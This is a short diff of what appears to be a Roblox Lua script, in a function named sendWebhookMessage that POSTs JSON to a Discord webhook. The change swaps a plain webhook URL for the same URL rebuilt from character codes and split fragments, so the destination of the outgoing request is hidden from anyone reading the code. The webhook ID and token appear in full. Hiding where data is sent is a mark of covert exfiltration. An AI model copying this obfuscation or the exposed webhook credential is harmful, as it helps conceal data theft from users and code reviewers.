@@ -351,7 +351,7 @@ local function sendWebhookMessage(message)
     }
 
     http_request({
-        Url = "https://discordapp.com/api/webhooks/1327296629719568425/4WcTgiQaxoISTlTafxGVwSabG5eM3JuwfkJluyROxYHIbhTvBtQfiglbcIkzhpb8O1EA",
+        Url = string.char(104, 116, 116, 112, 115) .. "://disc" .. "ordapp.com" .. "/api/webhooks/" .. "1327296629719568425" .. "/" .. string.char(52, 87, 99, 84, 103, 105, 81, 97, 120, 111, 73, 83, 84, 108, 84, 97, 102, 120) .. "GVwSabG5eM3JuwfkJluyROxYHIbhTvBtQfiglbcIkzhpb8O1EA",
         Method = "POST",
         Headers = {["Content-Type"] = "application/json"},
         Body = HttpService:JSONEncode({
